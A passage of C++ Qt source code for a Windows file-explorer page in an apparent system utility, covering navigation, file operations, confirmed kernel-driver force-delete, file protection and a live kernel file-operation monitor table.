        ExplorerLayout->addLayout(NavigationLayout);

        auto *CommandLayout = new QHBoxLayout;
        ConfigureToolbarLayout(CommandLayout);
        auto *HomeButton = new PushButton("Home", Fluent::IconType::HOME);
        auto *NewFolderButton = new PushButton("New folder", Fluent::IconType::FOLDER_ADD);
        CommandLayout->addWidget(HomeButton);
        CommandLayout->addWidget(NewFolderButton);
        CommandLayout->addStretch();
        StatusLabel = new BodyLabel;
        StatusLabel->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
        CommandLayout->addWidget(StatusLabel);
        ExplorerLayout->addLayout(CommandLayout);

        DirectoryModel = new QFileSystemModel(this);
        DirectoryModel->setFilter(QDir::AllDirs | QDir::NoDotAndDotDot | QDir::Drives);
        DirectoryModel->setRootPath(QString());

        FileModel = new QFileSystemModel(this);
        FileModel->setFilter(QDir::AllEntries | QDir::NoDotAndDotDot);
        FileModel->setReadOnly(false);
        FileModel->setNameFilterDisables(false);

        DirectoryTree = new QTreeView;
        DirectoryTree->setModel(DirectoryModel);
        DirectoryTree->setRootIndex(DirectoryModel->index(QString()));
        DirectoryTree->setHeaderHidden(true);
        DirectoryTree->setAnimated(true);
        DirectoryTree->setMinimumWidth(210);
        for (int Column = 1; Column < DirectoryModel->columnCount(); ++Column)
            DirectoryTree->hideColumn(Column);
        InstallFluentScrollBar(DirectoryTree, Qt::Vertical);

        FileView = new QTreeView;
        FileView->setModel(FileModel);
        FileView->setAlternatingRowColors(false);
        FileView->setRootIsDecorated(false);
        FileView->setItemsExpandable(false);
        FileView->setSortingEnabled(true);
        FileView->sortByColumn(0, Qt::AscendingOrder);
        FileView->setSelectionMode(QAbstractItemView::ExtendedSelection);
        FileView->setSelectionBehavior(QAbstractItemView::SelectRows);
        FileView->setEditTriggers(QAbstractItemView::NoEditTriggers);
        FileView->setContextMenuPolicy(Qt::CustomContextMenu);
        FileView->header()->setSectionResizeMode(0, QHeaderView::Stretch);
        FileView->header()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
        FileView->header()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
        FileView->header()->setSectionResizeMode(3, QHeaderView::ResizeToContents);
        InstallFluentScrollBar(FileView, Qt::Vertical);
        InstallFluentScrollBar(FileView, Qt::Horizontal);

        auto *Splitter = new QSplitter;
        Splitter->setChildrenCollapsible(false);
        Splitter->addWidget(DirectoryTree);
        Splitter->addWidget(FileView);
        Splitter->setStretchFactor(0, 0);
        Splitter->setStretchFactor(1, 1);
        Splitter->setSizes({230, 760});
        ExplorerLayout->addWidget(Splitter, 1);

        auto *ProtectedPage = new QWidget;
        auto *ProtectedLayout = new QVBoxLayout(ProtectedPage);
        ConfigurePageLayout(ProtectedLayout, 10);
        auto *ProtectedToolbar = new QHBoxLayout;
        ConfigureToolbarLayout(ProtectedToolbar);
        auto *ProtectedTitle = MakeLabel("ProtectedFiles", 13, KTextPrimary, QFont::DemiBold);
        UnprotectButton = MakeButton("Unprotect", true);
        UnprotectButton->setEnabled(false);
        ProtectedToolbar->addWidget(ProtectedTitle);
        ProtectedToolbar->addStretch();
        ProtectedToolbar->addWidget(UnprotectButton);
        ProtectedLayout->addLayout(ProtectedToolbar);
        ProtectedTable = MakeTable({"Name", "Protected path"});
        ProtectedTable->setSelectionMode(QAbstractItemView::ExtendedSelection);
        ProtectedTable->setProperty("DetailDialogTitle", "Protected file details");
        ProtectedTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        ProtectedTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        ProtectedLayout->addWidget(ProtectedTable, 1);

        auto *MonitorPage = new QWidget;
        auto *MonitorLayout = new QVBoxLayout(MonitorPage);
        ConfigurePageLayout(MonitorLayout, 10);
        auto *MonitorToolbar = new QHBoxLayout;
        ConfigureToolbarLayout(MonitorToolbar);
        auto *BrowseMonitorButton = MakeButton("Browse", true);
        auto *MonitorCurrentButton = MakeButton("Monitor current folder");
        MonitorStopButton = MakeButton("Stop");
        MonitorClearButton = MakeButton("Clear");
        MonitorStopButton->setEnabled(false);
        MonitorToolbar->addWidget(BrowseMonitorButton);
        MonitorToolbar->addWidget(MonitorCurrentButton);
        MonitorToolbar->addWidget(MonitorStopButton);
        MonitorToolbar->addWidget(MonitorClearButton);
        MonitorToolbar->addStretch();
        MonitorStatusLabel = new BodyLabel("Stopped");
        MonitorToolbar->addWidget(MonitorStatusLabel);
        MonitorLayout->addLayout(MonitorToolbar);

        auto *WatchInfoLayout = new QHBoxLayout;
        ConfigureToolbarLayout(WatchInfoLayout);
        auto *WatchTitle = MakeLabel("WatchedDirectory", 13, KTextPrimary, QFont::DemiBold);
        MonitorDirectoryLabel = new BodyLabel("-");
        MonitorDirectoryLabel->setWordWrap(true);
        WatchInfoLayout->addWidget(WatchTitle);
        WatchInfoLayout->addWidget(MonitorDirectoryLabel, 1);
        MonitorLayout->addLayout(WatchInfoLayout);

        MonitorSearchEdit = new SearchLineEdit;
        MonitorSearchEdit->setPlaceholderText("Search time, operation, process, PID, or path");
        MonitorSearchEdit->setClearButtonEnabled(true);
        MonitorLayout->addWidget(MonitorSearchEdit);

        MonitorTable = MakeTable({"Time", "Operation", "Process", "PID", "Path"});
        MonitorTable->setSelectionMode(QAbstractItemView::SingleSelection);
        MonitorTable->setContextMenuPolicy(Qt::CustomContextMenu);
        MonitorTable->setProperty("UseGenericDetailDialog", false);
        MonitorTable->setWordWrap(false);
        MonitorTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        MonitorTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
        MonitorTable->horizontalHeader()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
        MonitorTable->horizontalHeader()->setSectionResizeMode(3, QHeaderView::ResizeToContents);
        MonitorTable->horizontalHeader()->setSectionResizeMode(4, QHeaderView::ResizeToContents);
        MonitorLayout->addWidget(MonitorTable, 1);

        Pages->addWidget(ExplorerPage);
        Pages->addWidget(ProtectedPage);
        Pages->addWidget(MonitorPage);
        Layout->addWidget(Pages, 1);
        QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);
        QObject::connect(ProtectedTable, &QTableWidget::itemSelectionChanged, this, [this] {
            UnprotectButton->setEnabled(!ProtectedTable->selectionModel()->selectedRows(0).isEmpty());
        });
        QObject::connect(UnprotectButton, &QPushButton::clicked, this, [this] { UnprotectSelection(); });
        QObject::connect(BrowseMonitorButton, &QPushButton::clicked, this, [this] { BrowseMonitorDirectory(); });
        QObject::connect(MonitorCurrentButton, &QPushButton::clicked, this, [this] {
            StartMonitoringDirectory(CurrentPath, true, true);
        });
        QObject::connect(MonitorStopButton, &QPushButton::clicked, this, [this] { StopFileMonitor(true); });
        QObject::connect(MonitorClearButton, &QPushButton::clicked, this, [this] { ClearMonitorEvents(); });
        QObject::connect(MonitorSearchEdit, &QLineEdit::textChanged, this, [this] { RefreshMonitorTable(); });
        QObject::connect(MonitorTable, &QTableWidget::cellDoubleClicked, this,
                         [this](int Row, int Column) {
                             if (Column == 4)
                                 ShowMonitorPath(Row);
                             else
                                 ShowMonitorDetails(Row);
                         });
        QObject::connect(MonitorTable, &QWidget::customContextMenuRequested, this,
                         [this](const QPoint &Position) { ShowMonitorContextMenu(Position); });

        QObject::connect(BackButton, &QPushButton::clicked, this, [this] { NavigateHistory(-1); });
        QObject::connect(ForwardButton, &QPushButton::clicked, this, [this] { NavigateHistory(1); });
        QObject::connect(UpButton, &QPushButton::clicked, this, [this] {
            const QDir Directory(CurrentPath);
            NavigateTo(QFileInfo(Directory.absolutePath()).dir().absolutePath());
        });
        QObject::connect(RefreshButton, &QPushButton::clicked, this, [this] {
            FileModel->setRootPath(QString());
            FileModel->setRootPath(CurrentPath);
            FileView->setRootIndex(FileModel->index(CurrentPath));
            UpdateStatus();
            ShowSuccessNotice(this, "File", "Folder refreshed.");
        });
        QObject::connect(AddressEdit, &QLineEdit::returnPressed, this, [this] {
            NavigateTo(QDir::fromNativeSeparators(AddressEdit->text().trimmed()));
        });
        QObject::connect(SearchEdit, &QLineEdit::textChanged, this, [this](const QString &Text) {
            FileModel->setNameFilters(Text.trimmed().isEmpty() ? QStringList() : QStringList{"*" + Text.trimmed() + "*"});
            UpdateStatus();
        });
        QObject::connect(DirectoryTree, &QTreeView::clicked, this, [this](const QModelIndex &Index) {
            NavigateTo(DirectoryModel->filePath(Index));
        });
        QObject::connect(FileView, &QTreeView::doubleClicked, this, [this](const QModelIndex &Index) {
            const QFileInfo Information = FileModel->fileInfo(Index);
            if (Information.isDir())
                NavigateTo(Information.absoluteFilePath());
            else
                QDesktopServices::openUrl(QUrl::fromLocalFile(Information.absoluteFilePath()));
        });
        QObject::connect(FileView->selectionModel(), &QItemSelectionModel::selectionChanged, this,
                         [this] { UpdateStatus(); });
        QObject::connect(HomeButton, &QPushButton::clicked, this, [this] {
            NavigateTo(QStandardPaths::writableLocation(QStandardPaths::HomeLocation));
        });
        QObject::connect(NewFolderButton, &QPushButton::clicked, this, [this] { CreateFolder(); });
        QObject::connect(FileView, &QWidget::customContextMenuRequested, this,
                         [this](const QPoint &Position) { ShowContextMenu(Position); });

        MonitorRefreshTimer = new QTimer(this);
        MonitorRefreshTimer->setInterval(150);
        QObject::connect(MonitorRefreshTimer, &QTimer::timeout, this, [this] {
            const uint64_t Version = MonitorVersion.load(std::memory_order_relaxed);
            if (DisplayedMonitorVersion != Version) {
                DisplayedMonitorVersion = Version;
                RefreshMonitorTable();
            }
        });
        MonitorRefreshTimer->start();

        NavigateTo(QStandardPaths::writableLocation(QStandardPaths::HomeLocation));
    }

    ~FileExplorerPage() override
    {
        StopFileMonitor(false);
    }

  private:
    static QString FileMajorOperation(ULONG Major)
    {
        switch (Major)
        {
        case 0x00: return "IRP_MJ_CREATE";
        case 0x04: return "IRP_MJ_WRITE";
        case 0x06: return "IRP_MJ_SET_INFORMATION";
        default: return QString("Major 0x%1").arg(Major, 0, 16).toUpper();
        }
    }

    static FileMonitorEntry BuildMonitorEntry(const MonitorEvent &Event)
    {
        const QString Extra = QString::fromWCharArray(Event.Extra);
        const QString Operation = Extra.contains(" | ") ? Extra.section(" | ", 0, 0) : Extra;
        const QString ProcessImage = Extra.contains(" | ") ? Extra.section(" | ", 1) : QString();
        const std::wstring ProcessName = GetProcessNameFromPid(Event.ProcessId);
        const QString Process = ProcessImage.isEmpty()
                                    ? (ProcessName.empty() ? "<unknown>" : QString::fromStdWString(ProcessName))
                                    : QString("%1 | %2")
                                          .arg(ProcessName.empty() ? "<unknown>" : QString::fromStdWString(ProcessName),
                                               ProcessImage);
        FileMonitorEntry Entry;
        Entry.Timestamp = MonitorTimestamp(Event.TimeStamp);
        Entry.Operation = Operation.isEmpty() ? "FileOp" : Operation;
        Entry.Process = Process;
        Entry.Path = QString::fromWCharArray(Event.Path);
        Entry.ProcessId = Event.ProcessId;
        Entry.ThreadId = Event.ThreadId;
        Entry.Detail = QString("%1\n\nProcess: %2\nPID: %3\nTID: %4\nOperation: %5\nPath: %6\nExtra: %7\nMajor: %8\nMinor: %9 (0x%10)")
                           .arg(Entry.Timestamp)
                           .arg(Entry.Process)
                           .arg(Entry.ProcessId)
                           .arg(Entry.ThreadId)
                           .arg(Entry.Operation)
                           .arg(Entry.Path)
                           .arg(Extra.isEmpty() ? "-" : Extra)
                           .arg(FileMajorOperation(Event.Data1))
                           .arg(Event.Data2)
                           .arg(QString::number(Event.Data2, 16).toUpper());
        return Entry;
    }

    ToolButton *CreateNavigationButton(Fluent::IconType Icon, const QString &ToolTip)
    {
        auto *Button = new ToolButton(Icon);
        Button->setFixedSize(36, 36);
        Button->setToolTip(ToolTip);
        Button->setCursor(Qt::PointingHandCursor);
        return Button;
    }

    void NavigateTo(const QString &Path, bool AddHistory = true)
    {
        const QFileInfo Information(Path);
        const QString AbsolutePath = QDir::cleanPath(Information.absoluteFilePath());
        if (!Information.exists() || !Information.isDir())
        {
            ShowErrorNotice(this, "File", "The folder does not exist or cannot be accessed.");
            AddressEdit->setText(QDir::toNativeSeparators(CurrentPath));
            return;
        }
        if (AddHistory && AbsolutePath != CurrentPath)
        {
            while (History.size() > HistoryIndex + 1)
                History.removeLast();
            History.append(AbsolutePath);
            HistoryIndex = History.size() - 1;
        }
        CurrentPath = AbsolutePath;
        AddressEdit->setText(QDir::toNativeSeparators(CurrentPath));
        FileModel->setRootPath(CurrentPath);
        FileView->setRootIndex(FileModel->index(CurrentPath));
        const QModelIndex DirectoryIndex = DirectoryModel->index(CurrentPath);
        DirectoryTree->setCurrentIndex(DirectoryIndex);
        DirectoryTree->scrollTo(DirectoryIndex);
        BackButton->setEnabled(HistoryIndex > 0);
        ForwardButton->setEnabled(HistoryIndex >= 0 && HistoryIndex + 1 < History.size());
        UpButton->setEnabled(QFileInfo(CurrentPath).dir().absolutePath() != CurrentPath);
        UpdateStatus();
    }

    void NavigateHistory(int Offset)
    {
        const int NextIndex = HistoryIndex + Offset;
        if (NextIndex < 0 || NextIndex >= History.size())
            return;
        HistoryIndex = NextIndex;
        NavigateTo(History.at(HistoryIndex), false);
    }

    QStringList SelectedPaths() const
    {
        QStringList Paths;
        for (const QModelIndex &Index : FileView->selectionModel()->selectedRows(0))
            Paths.append(FileModel->filePath(Index));
        return Paths;
    }

    void UpdateStatus()
    {
        const int VisibleItems = FileModel->rowCount(FileView->rootIndex());
        const int SelectedItems = SelectedPaths().size();
        StatusLabel->setText(SelectedItems > 0 ? QString("%1 items  |  %2 selected").arg(VisibleItems).arg(SelectedItems)
                                               : QString("%1 items").arg(VisibleItems));
    }

    void CreateFolder()
    {
        bool Accepted = false;
        const QString Name = QInputDialog::getText(this, "New folder", "Folder name:", QLineEdit::Normal,
                                                   "New folder", &Accepted).trimmed();
        if (!Accepted || Name.isEmpty())
            return;
        if (!QDir(CurrentPath).mkdir(Name))
            ShowErrorNotice(this, "File", "Failed to create the folder.");
        else
            ShowSuccessNotice(this, "File", "Folder created successfully.");
    }

    void RenameSelection()
    {
        const QStringList Paths = SelectedPaths();
        if (Paths.size() != 1)
        {
            ShowWarningNotice(this, "Rename", "Select exactly one item to rename.");
            return;
        }
        const QFileInfo Information(Paths.first());
        bool Accepted = false;
        const QString Name = QInputDialog::getText(this, "Rename", "New name:", QLineEdit::Normal,
                                                   Information.fileName(), &Accepted).trimmed();
        if (!Accepted || Name.isEmpty() || Name == Information.fileName())
            return;
        const QString Destination = Information.dir().absoluteFilePath(Name);
        if (!QDir().rename(Information.absoluteFilePath(), Destination))
            ShowErrorNotice(this, "Rename", "Failed to rename the selected item.");
        else
            ShowSuccessNotice(this, "Rename", "Item renamed successfully.");
    }

    void DeleteSelection()
    {
        const QStringList Paths = SelectedPaths();
        if (Paths.isEmpty())
            return;
        const QString Prompt = QString("Permanently delete %1 selected item(s)?").arg(Paths.size());
        if (QMessageBox::question(this, "Delete", Prompt) != QMessageBox::Yes)
            return;
        QStringList Failures;
        for (const QString &Path : Paths)
        {
            const QFileInfo Information(Path);
            const bool Removed = Information.isDir() ? QDir(Path).removeRecursively() : QFile::remove(Path);
            if (!Removed)
                Failures.append(Information.fileName());
        }
        if (!Failures.isEmpty())
            ShowErrorNotice(this, "Delete", "Failed to delete:\n" + Failures.join("\n"));
        else
            ShowSuccessNotice(this, "Delete", QString("Deleted %1 item(s).").arg(Paths.size()));
    }

    void DeleteSelectionR0()
    {
        const QStringList Paths = SelectedPaths();
        if (Paths.isEmpty())
            return;
        for (const QString &Path : Paths)
        {
            if (QFileInfo(Path).isDir())
            {
                ShowWarningNotice(this, "Delete (R0)", "Delete (R0) only supports files.");
                return;
            }
        }
        const QString Prompt = QString("Force delete %1 selected file(s) through the kernel driver?").arg(Paths.size());
        if (QMessageBox::warning(this, "Delete (R0)", Prompt, QMessageBox::Yes | QMessageBox::No,
                                 QMessageBox::No) != QMessageBox::Yes)
            return;
        QStringList Failures;
        for (const QString &Path : Paths)
        {
            const std::wstring WidePath = QDir::toNativeSeparators(Path).toStdWString();
            if (!ForceDeleteFile(WidePath.c_str()))
                Failures.append(QString("%1 (error %2)").arg(QFileInfo(Path).fileName()).arg(G_LastMultiDrvError));
        }
        if (!Failures.isEmpty())
            ShowErrorNotice(this, "Delete (R0)", "Failed to force delete:\n" + Failures.join("\n"));
        else
            ShowSuccessNotice(this, "Delete (R0)", QString("Force deleted %1 file(s).").arg(Paths.size()));
    }

    bool CopyRecursively(const QString &SourcePath, const QString &DestinationPath)
    {
        const QFileInfo SourceInformation(SourcePath);
        if (SourceInformation.isDir())
        {
            QDir DestinationDirectory;
            if (!DestinationDirectory.mkpath(DestinationPath))
                return false;
            const QDir SourceDirectory(SourcePath);
            for (const QFileInfo &Child : SourceDirectory.entryInfoList(QDir::AllEntries | QDir::NoDotAndDotDot))
            {
                if (!CopyRecursively(Child.absoluteFilePath(), QDir(DestinationPath).filePath(Child.fileName())))
                    return false;
            }
            return true;
        }
        if (QFileInfo::exists(DestinationPath))
            return false;
        return QFile::copy(SourcePath, DestinationPath);
    }

    void CopySelection()
    {
        const QStringList Paths = SelectedPaths();
        if (Paths.isEmpty())
            return;
        const QString DestinationDirectory = QFileDialog::getExistingDirectory(this, "Copy to", CurrentPath);
        if (DestinationDirectory.isEmpty())
            return;
        QStringList Failures;
        for (const QString &Path : Paths)
        {
            const QFileInfo Information(Path);
            const QString DestinationPath = QDir(DestinationDirectory).filePath(Information.fileName());
            if (!CopyRecursively(Information.absoluteFilePath(), DestinationPath))
                Failures.append(Information.fileName());
        }
        if (!Failures.isEmpty())
            ShowErrorNotice(this, "Copy", "Failed to copy:\n" + Failures.join("\n") +
                                           "\nThe destination item may already exist.");
        else
            ShowSuccessNotice(this, "Copy", QString("Copied %1 item(s).").arg(Paths.size()));
    }

    void CopySelectionPath()
    {
        const QStringList Paths = SelectedPaths();
        qApp->clipboard()->setText(Paths.isEmpty() ? QDir::toNativeSeparators(CurrentPath)
                                                   : Paths.join("\n"));
        ShowSuccessNotice(this, "Copy path", "Path copied to the clipboard.");
    }

    void BrowseMonitorDirectory()
    {
        const QString Directory = QFileDialog::getExistingDirectory(this, "Monitor directory", CurrentPath);
        if (Directory.isEmpty())
            return;
        StartMonitoringDirectory(Directory, true, true);
    }

    void EnsureFileMonitorWorker()
    {
        if (FileMonitor)
            return;

        FileMonitor = std::make_unique<KernelMonitor>(MonitorChannel::File);
        QPointer<FileExplorerPage> Page(this);
        FileMonitor->SetCallback([Page](const MonitorEvent &Event) {
            if (!Page)
                return;
            QMetaObject::invokeMethod(Page, [Page, Event] {
                if (Page)
                    Page->AppendMonitorEvent(Event);
            }, Qt::QueuedConnection);
        });
    }

    void StartMonitoringDirectory(const QString &DirectoryPath, bool SwitchToMonitorTab, bool ShowNotice)
    {
        const QFileInfo Information(DirectoryPath);
        const QString AbsoluteDirectory = Information.isDir() ? Information.absoluteFilePath() : Information.absolutePath();
        if (AbsoluteDirectory.isEmpty() || !QFileInfo(AbsoluteDirectory).isDir())
        {
            ShowErrorNotice(this, "File monitor", "Select a valid directory first.");
            return;
        }

        QString NtPath;
        if (!ConvertToNtPath(AbsoluteDirectory, NtPath))
        {
            ShowErrorNotice(this, "File monitor", "Unable to convert the directory to an NT path.");
            return;
        }

        try
        {
            EnsureFileMonitorWorker();
            if (!MonitorDrvSetWatchDirectory(NtPath.toStdWString().c_str()))
            {
                ShowErrorNotice(this, "File monitor",
                                QString("Kernel watch setup failed (error %1).").arg(GetLastError()));
                return;
            }

            if (!FileMonitor->IsRunning() && !FileMonitor->Start())
            {
                ShowErrorNotice(this, "File monitor", "Failed to start the file monitor worker.");
                return;
            }
        }
        catch (const std::exception &Error)
        {
            FileMonitor.reset();
            ShowErrorNotice(this, "File monitor", QString::fromLocal8Bit(Error.what()));
            return;
        }

        WatchedDisplayPath = QDir::toNativeSeparators(AbsoluteDirectory);
        WatchedNtPath = NtPath;
        ClearMonitorEvents();
        MonitorStatusLabel->setText("Running");
        MonitorDirectoryLabel->setText(WatchedDisplayPath);
        MonitorStopButton->setEnabled(true);
        if (SwitchToMonitorTab && TabBarWidget)
            TabBarWidget->setCurrentIndex(2);
        if (ShowNotice)
            ShowSuccessNotice(this, "File monitor", "Directory monitoring started.");
    }

    void StopFileMonitor(bool ShowNotice)
    {
        if (FileMonitor)
        {
            FileMonitor->Stop();
            FileMonitor.reset();
        }

        MonitorDrvClearWatchDirectory();
        WatchedDisplayPath.clear();
        WatchedNtPath.clear();
        if (MonitorStatusLabel)
            MonitorStatusLabel->setText("Stopped");
        if (MonitorDirectoryLabel)
            MonitorDirectoryLabel->setText("-");
        if (MonitorStopButton)
            MonitorStopButton->setEnabled(false);
        if (ShowNotice)
            ShowSuccessNotice(this, "File monitor", "Directory monitoring stopped.");
    }

    void AppendMonitorEvent(const MonitorEvent &Event)
    {
        std::lock_guard<std::mutex> Lock(MonitorMutex);
        MonitorEvents.insert(MonitorEvents.begin(), BuildMonitorEntry(Event));
        if (MonitorEvents.size() > 500)
            MonitorEvents.resize(500);
        MonitorVersion.fetch_add(1, std::memory_order_relaxed);
    }

    void ClearMonitorEvents()
    {
        {
            std::lock_guard<std::mutex> Lock(MonitorMutex);
            MonitorEvents.clear();
            MonitorVersion.fetch_add(1, std::memory_order_relaxed);
        }
        RefreshMonitorTable();
    }

    void RefreshMonitorTable()
    {
        if (!MonitorTable)
            return;

        std::vector<FileMonitorEntry> Rows;
        {
            std::lock_guard<std::mutex> Lock(MonitorMutex);
            Rows = MonitorEvents;
        }

        const QString Query = MonitorSearchEdit ? MonitorSearchEdit->text().trimmed() : QString();
        MonitorTable->setUpdatesEnabled(false);
        MonitorTable->clearContents();
        MonitorTable->setRowCount(0);
        for (const FileMonitorEntry &Entry : Rows)
        {
            const QString PidText = QString::number(Entry.ProcessId);
            if (!Query.isEmpty() &&
                !Entry.Timestamp.contains(Query, Qt::CaseInsensitive) &&
                !Entry.Operation.contains(Query, Qt::CaseInsensitive) &&
                !Entry.Process.contains(Query, Qt::CaseInsensitive) &&
                !Entry.Path.contains(Query, Qt::CaseInsensitive) &&
                !Entry.Detail.contains(Query, Qt::CaseInsensitive) &&
                !PidText.contains(Query, Qt::CaseInsensitive))
            {
                continue;
            }

            const int Row = MonitorTable->rowCount();
            MonitorTable->insertRow(Row);
            auto *TimeItem = new QTableWidgetItem(Entry.Timestamp);
            TimeItem->setData(Qt::UserRole, Entry.Detail);
            MonitorTable->setItem(Row, 0, TimeItem);
            MonitorTable->setItem(Row, 1, new QTableWidgetItem(Entry.Operation));
            MonitorTable->setItem(Row, 2, new QTableWidgetItem(Entry.Process));
            MonitorTable->setItem(Row, 3, new QTableWidgetItem(PidText));
            auto *PathItem = new QTableWidgetItem(Entry.Path);
            PathItem->setToolTip(Entry.Path);
            MonitorTable->setItem(Row, 4, PathItem);
            MonitorTable->setRowHeight(Row, 38);
        }
        MonitorTable->resizeColumnToContents(4);
        MonitorTable->setUpdatesEnabled(true);
    }

    void ShowMonitorDetails(int Row)
    {
        QTableWidgetItem *Item = MonitorTable->item(Row, 0);
        if (!Item)
            return;
        const QString Detail = Item->data(Qt::UserRole).toString();
        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle("File monitor details");
        Dialog->resize(920, 620);
        auto *Layout = new QVBoxLayout(Dialog);
        auto *Text = new PlainTextEdit;
        Text->setReadOnly(true);
        Text->setFont(QFont("Cascadia Mono", 10));
        Text->setPlainText(Detail);
        InstallFluentScrollBar(Text, Qt::Vertical);
        Layout->addWidget(Text, 1);
        auto *Close = MakeButton("Close", true);
        Layout->addWidget(Close, 0, Qt::AlignRight);
        QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();
    }

    void ShowMonitorPath(int Row)
    {
        QTableWidgetItem *Item = MonitorTable->item(Row, 4);
        if (!Item)
            return;

        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle("File path");
        Dialog->resize(920, 220);
        auto *Layout = new QVBoxLayout(Dialog);
        auto *Text = new PlainTextEdit;
        Text->setReadOnly(true);
        Text->setFont(QFont("Cascadia Mono", 10));
        Text->setPlainText(Item->text());
        InstallFluentScrollBar(Text, Qt::Vertical);
        Layout->addWidget(Text, 1);
        auto *Close = MakeButton("Close", true);
        Layout->addWidget(Close, 0, Qt::AlignRight);
        QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();
    }

    void ShowMonitorContextMenu(const QPoint &Position)
    {
        const QModelIndex Index = MonitorTable->indexAt(Position);
        if (!Index.isValid())
            return;
        MonitorTable->selectRow(Index.row());
        auto *Menu = new RoundMenu(QString(), this);
        auto *CopyAction = new QAction("Copy information", Menu);
        auto *DetailAction = new QAction("Detailed information", Menu);
        Menu->addAction(CopyAction);
        Menu->addAction(DetailAction);
        ConnectMenuAction(CopyAction, this, [this, Row = Index.row()] {
            if (auto *Item = MonitorTable->item(Row, 0))
            {
                qApp->clipboard()->setText(Item->data(Qt::UserRole).toString());
                ShowSuccessNotice(this, "File monitor", "Event information copied.");
            }
        });
        ConnectMenuAction(DetailAction, this, [this, Row = Index.row()] { ShowMonitorDetails(Row); });
        ReleaseMenuAfterClose(Menu);
        Menu->exec(MonitorTable->viewport()->mapToGlobal(Position));
    }

    void ProtectSelection()
    {
        const QStringList Paths = SelectedPaths();
        if (Paths.isEmpty())
            return;
        QStringList Failures;
        int ProtectedCount = 0;
        for (const QString &Path : Paths)
        {
            const QString NormalizedPath = QDir::toNativeSeparators(QFileInfo(Path).absoluteFilePath());
            QString NtPath;
            if (!ConvertToNtPath(NormalizedPath, NtPath))
            {
                Failures.append(QFileInfo(Path).fileName());
                continue;
            }
            const std::wstring WidePath = NtPath.toStdWString();
            if (!ProtectFile(WidePath.c_str()))
                Failures.append(QFileInfo(Path).fileName());
            else
            {
                const auto Match = std::find_if(ProtectedFiles.begin(), ProtectedFiles.end(),
                                                [&NormalizedPath](const ProtectedFileEntry &Entry) {
                    return Entry.DisplayPath.compare(NormalizedPath, Qt::CaseInsensitive) == 0;
                });
                if (Match == ProtectedFiles.end())
                    ProtectedFiles.append({NormalizedPath, NtPath});
                ++ProtectedCount;
            }
        }
        RefreshProtectedTable();
        if (Failures.isEmpty())
            ShowSuccessNotice(this, "Protect", QString("Protected %1 item(s).").arg(ProtectedCount));
        else
            ShowErrorNotice(this, "Protect", "Failed to protect:\n" + Failures.join("\n"));
    }

    void RefreshProtectedTable()
    {
        ProtectedTable->clearContents();
        ProtectedTable->setRowCount(ProtectedFiles.size());
        for (int Row = 0; Row < ProtectedFiles.size(); ++Row)
        {
            const ProtectedFileEntry &Entry = ProtectedFiles.at(Row);
            auto *NameItem = new QTableWidgetItem(QFileInfo(Entry.DisplayPath).fileName());
            NameItem->setData(Qt::UserRole, Entry.DisplayPath);
            NameItem->setData(Qt::UserRole + 1, Entry.NtPath);
            ProtectedTable->setItem(Row, 0, NameItem);
            ProtectedTable->setItem(Row, 1, new QTableWidgetItem(Entry.DisplayPath));
            ProtectedTable->setRowHeight(Row, 38);
        }
        UnprotectButton->setEnabled(false);
    }

    void UnprotectSelection()
    {
        QList<ProtectedFileEntry> Entries;
        for (const QModelIndex &Index : ProtectedTable->selectionModel()->selectedRows(0))
            Entries.append({Index.data(Qt::UserRole).toString(), Index.data(Qt::UserRole + 1).toString()});
        if (Entries.isEmpty())
            return;
        QStringList Failures;
        for (const ProtectedFileEntry &Entry : Entries)
        {
            const std::wstring WidePath = Entry.NtPath.toStdWString();
            if (!UnprotectFile(WidePath.c_str()))
                Failures.append(QFileInfo(Entry.DisplayPath).fileName());
            else
            {
                const auto Match = std::find_if(ProtectedFiles.begin(), ProtectedFiles.end(),
                                                [&Entry](const ProtectedFileEntry &Item) {
                    return Item.DisplayPath.compare(Entry.DisplayPath, Qt::CaseInsensitive) == 0;
                });
                if (Match != ProtectedFiles.end())
                    ProtectedFiles.erase(Match);
            }
        }
        RefreshProtectedTable();
        if (!Failures.isEmpty())
            ShowErrorNotice(this, "Unprotect", "Failed to unprotect:\n" + Failures.join("\n"));
        else
            ShowSuccessNotice(this, "Unprotect", QString("Unprotected %1 item(s).").arg(Entries.size()));
    }

    bool ConvertToNtPath(const QString &Path, QString &NtPath) const
    {
        QString NativePath = QDir::toNativeSeparators(Path);
        if (NativePath.startsWith("\\Device\\", Qt::CaseInsensitive))
        {
            NtPath = NativePath;
            return true;
        }
        if (NativePath.startsWith("\\\\"))
        {
            NtPath = "\\Device\\Mup" + NativePath.mid(1);
            return true;
        }
        if (NativePath.size() < 3 || NativePath.at(1) != ':')
            return false;

        const QString Drive = NativePath.left(2);
        std::vector<wchar_t> DeviceBuffer(32768, L'\0');
        if (QueryDosDeviceW(reinterpret_cast<LPCWSTR>(Drive.utf16()), DeviceBuffer.data(),
                            static_cast<DWORD>(DeviceBuffer.size())) == 0)
            return false;
        NtPath = QString::fromWCharArray(DeviceBuffer.data()) + NativePath.mid(2);
        return NtPath.startsWith("\\Device\\", Qt::CaseInsensitive);
    }

    void ShowContextMenu(const QPoint &Position)
    {
        const QModelIndex Index = FileView->indexAt(Position);
        if (!Index.isValid())
            return;
        const QModelIndex NameIndex = Index.siblingAtColumn(0);
        if (!FileView->selectionModel()->isSelected(NameIndex))
        {
            FileView->selectionModel()->clearSelection();
            FileView->selectionModel()->select(NameIndex,
                QItemSelectionModel::Select | QItemSelectionModel::Rows);
            FileView->setCurrentIndex(NameIndex);
        }

        auto *Menu = new RoundMenu(QString(), this);
        auto *DeleteAction = new QAction("Delete", Menu);
        auto *DeleteR0Action = new QAction("Delete (R0)", Menu);
